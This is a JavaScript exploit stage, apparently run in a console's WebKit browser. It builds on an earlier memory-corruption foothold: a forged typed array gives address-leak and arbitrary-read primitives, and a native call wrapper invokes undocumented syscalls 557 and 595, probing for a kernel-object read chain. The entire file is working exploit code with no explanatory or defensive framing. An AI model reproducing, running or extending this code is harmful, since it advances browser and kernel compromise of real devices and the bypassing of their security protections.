// 557→595 pairing: create handles with 557 (name-keyed allocator), then
// look them up with 595 (ID lookup that returns ESRCH with zero args —
// suggesting it takes an ID and returns data). If 595 returns data for
// 557-created handles, we have a kernel-object read chain. Also probes
// 595 with module handles from the 592 list for comparison.
// Read-only on 595 side; 557 allocations are new objects (same class as
// prior calls today). Both wrappers byte-gated by installer v21.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys557 !== "number" ||
      typeof native.wrappers.sys595 !== "number")
    throw new Error("chain_or_wrappers_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function toHex(bytes, cap) {
    var limit = Math.min(bytes.length, cap || 64);
    var out = "";
    for (var i = 0; i < limit; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("pair_preflight");
  // Shared buffers in plan.frame
  var bufOff = 0x200, bufLen = 0x400;
  var bufAddr = plan.addresses.frame + bufOff;
  var outOff = 0x700, outLen = 0x200;
  var outAddr = plan.addresses.frame + outOff;
  var fv = new DataView(plan.frame.buffer);
  var bufOrig = [];
  for (var b = 0; b < 0x600; b++)
    bufOrig.push(plan.frame[bufOff + b]);
  function resetBufs() {
    plan.frame.fill(0, bufOff, bufOff + 0x600);
  }
  function call557(nameText) {
    putString(nameText);
    return native.call("sys557", [nameAddress(), nameText.length + 1]);
  }
  function nameAddress() { return plan.addresses.frame + 0x500; }
  function putString(text) {
    plan.frame.fill(0, 0x500, 0x500 + 0x100);
    for (var i = 0; i < text.length; i++)
      plan.frame[0x500 + i] = text.charCodeAt(i) & 255;
  }
  function call595(id, outBuf, outLen) {
    return native.call("sys595",
      [id, outBuf || 0, outLen || 0, 0, 0, 0]);
  }
  phase = "alloc";
  mark("pair_alloc_start");
  var names = ["Fw14TestAlpha", "Fw14TestBeta", "libSceVideoOut.sprx"];
  var handles = [];
  for (var a = 0; a < names.length; a++) {
    resetBufs();
    var r = call557(names[a]);
    var ret = r.value;
    var errno = (ret === -1) ? native.readErrno() : null;
    handles.push({ name: names[a], ret: ret, errno: errno });
    mark("pair_alloc_" + a);
  }
  phase = "lookup";
  mark("pair_lookup_start");
  var lookupResults = [];
  // Try 595 with each allocated handle ID
  for (var h = 0; h < handles.length; h++) {
    resetBufs();
    plan.frame.fill(0xa5, outOff, outOff + outLen);
    var id = handles[h].ret;
    if (id === -1 || id === 0) {
      lookupResults.push("h" + h + ":invalid_id");
      continue;
    }
    var r595 = call595(id, outAddr, outLen);
    var e595 = (r595.value === -1) ? native.readErrno() : null;
    var changed = false, hex = "";
    for (var i = 0; i < outLen; i++) {
      if (plan.frame[outOff + i] !== 0xa5) { changed = true; break; }
    }
    if (changed) {
      for (var d = 0; d < 48; d++)
        hex += ("0" + plan.frame[outOff + d].toString(16)).slice(-2);
    }
    lookupResults.push("h" + h + "(id" + id + "):ret" + r595.value +
      "/e" + e595 + "/chg" + (changed ? 1 : 0) +
      (changed ? "/" + hex : ""));
  }
  // Also try 595 with the known module handles from 592 list
  var modHandles = [0x2001, 0x2, 0x10, 0x12, 0x48, 0x49, 0x53];
  for (var mh = 0; mh < modHandles.length; mh++) {
    resetBufs();
    plan.frame.fill(0xa5, outOff, outOff + outLen);
    var r595m = call595(modHandles[mh], outAddr, outLen);
    var e595m = (r595m.value === -1) ? native.readErrno() : null;
    var changedM = false, hexM = "";
    for (var i2 = 0; i2 < outLen; i2++) {
      if (plan.frame[outOff + i2] !== 0xa5) { changedM = true; break; }
    }
    if (changedM) {
      for (var d2 = 0; d2 < 48; d2++)
        hexM += ("0" + plan.frame[outOff + d2].toString(16)).slice(-2);
    }
    lookupResults.push("mod" + modHandles[mh].toString(16) +
      ":ret" + r595m.value + "/e" + e595m +
      "/chg" + (changedM ? 1 : 0) + (changedM ? "/" + hexM : ""));
  }
  mark("pair_lookup_done");
  // Restore
  for (var r = 0; r < 0x600; r++)
    plan.frame[bufOff + r] = bufOrig[r];
  var after = native.call("getpid", []);
  mark("pair_done");
  result = { id: "pair_557_595_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { allocs: handles.map(function (h) {
        return h.name + ":ret" + h.ret + "/e" + h.errno;
      }).join(" | "),
      lookups: lookupResults.join(" | ").slice(0, 512),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "pair_557_595_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
